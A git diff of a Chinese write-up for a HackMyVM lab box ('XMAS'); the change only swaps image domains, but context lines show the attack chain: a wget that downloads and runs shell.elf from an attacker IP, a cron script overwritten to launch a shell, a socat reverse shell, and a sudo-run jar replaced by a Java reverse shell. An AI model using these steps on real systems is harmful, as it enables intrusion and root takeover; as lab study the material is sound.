@@ -12,26 +12,26 @@ toc: "true"
 ```
 ## 端口扫描
 
-![HMM_XMAS_image_1](https://img.l1uyun.one/HMM_XMAS_image_1.png)
+![HMM_XMAS_image_1](https://img.l1uyun.top/HMM_XMAS_image_1.png)
 
 
-![HMM_XMAS_image_2](https://img.l1uyun.one/HMM_XMAS_image_2.png)
+![HMM_XMAS_image_2](https://img.l1uyun.top/HMM_XMAS_image_2.png)
 
 ## web 服务
 目录扫描
 
-![HMM_XMAS_image_3](https://img.l1uyun.one/HMM_XMAS_image_3.png)
+![HMM_XMAS_image_3](https://img.l1uyun.top/HMM_XMAS_image_3.png)
 
 在主页的下面发现了一个上传点, 直接上传反弹 shell
 
-![HMM_XMAS_image_4](https://img.l1uyun.one/HMM_XMAS_image_4.png)
+![HMM_XMAS_image_4](https://img.l1uyun.top/HMM_XMAS_image_4.png)
 
 使用 nc 失败, 换成了 webshell
 
-![HMM_XMAS_image_5](https://img.l1uyun.one/HMM_XMAS_image_5.png)
+![HMM_XMAS_image_5](https://img.l1uyun.top/HMM_XMAS_image_5.png)
 
 
-![HMM_XMAS_image_6](https://img.l1uyun.one/HMM_XMAS_image_6.png)
+![HMM_XMAS_image_6](https://img.l1uyun.top/HMM_XMAS_image_6.png)
 然后还是用了 meterpreter
 
 ```bash
@@ -41,11 +41,11 @@ wget http://192.168.10.11:8000/shell.elf -O /tmp/shell.elf&&chmod 777 /tmp/shell
 
 /home/alabaster/nice_list. txt
 
-![HMM_XMAS_image_7](https://img.l1uyun.one/HMM_XMAS_image_7.png)
+![HMM_XMAS_image_7](https://img.l1uyun.top/HMM_XMAS_image_7.png)
 
 这有个 python 代码,. 在 linpeas. sh 枚举之后发现是定时任务, 并且是可写的
 
-![HMM_XMAS_image_8](https://img.l1uyun.one/HMM_XMAS_image_8.png)
+![HMM_XMAS_image_8](https://img.l1uyun.top/HMM_XMAS_image_8.png)
 
 
 ```bash
@@ -57,7 +57,7 @@ echo 'import subprocess; subprocess.call(["/tmp/newshell.elf"])' > nice_or_naugh
 
 又是这样子不稳定的 shell
 
-![HMM_XMAS_image_9](https://img.l1uyun.one/HMM_XMAS_image_9.png)
+![HMM_XMAS_image_9](https://img.l1uyun.top/HMM_XMAS_image_9.png)
 
 上传一个 socat 二进制文件上去算了
 
@@ -66,15 +66,15 @@ echo 'import subprocess; subprocess.call(["/tmp/socat", "TCP:192.168.10.11:4445"
 ```
 还是不行
 
-![HMM_XMAS_image_10](https://img.l1uyun.one/HMM_XMAS_image_10.png)
+![HMM_XMAS_image_10](https://img.l1uyun.top/HMM_XMAS_image_10.png)
 ## User-alabaster
 巨魔大佬 nb
 
 又学到一个工具 pwncat
-![HMM_XMAS_image_11](https://img.l1uyun.one/HMM_XMAS_image_11.png)
+![HMM_XMAS_image_11](https://img.l1uyun.top/HMM_XMAS_image_11.png)
 
 ## 提权_sudo 执行 jar
-![HMM_XMAS_image_12](https://img.l1uyun.one/HMM_XMAS_image_12.png)
+![HMM_XMAS_image_12](https://img.l1uyun.top/HMM_XMAS_image_12.png)
 
 利用 sudo 涉及的文件可写, 用 gpt 生成了个 java 的反弹 shell
 
@@ -91,7 +91,7 @@ echo 'Main-Class: ReverseShell' > Manifest.txt
 jar cfm ReverseShell.jar Manifest.txt ReverseShell.class
 ```
 
-![HMM_XMAS_image_13](https://img.l1uyun.one/HMM_XMAS_image_13.png)
+![HMM_XMAS_image_13](https://img.l1uyun.top/HMM_XMAS_image_13.png)
 
 ```bash
 cd /tmp 
@@ -100,6 +100,6 @@ cp ReverseShell.jar /home/alabaster/PublishList/PublishList.jar
 sudo -u root /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar
 ```
 
-![HMM_XMAS_image_14](https://img.l1uyun.one/HMM_XMAS_image_14.png)
+![HMM_XMAS_image_14](https://img.l1uyun.top/HMM_XMAS_image_14.png)
 
-![HMM_XMAS_image_15](https://img.l1uyun.one/HMM_XMAS_image_15.png)
+![HMM_XMAS_image_15](https://img.l1uyun.top/HMM_XMAS_image_15.png)
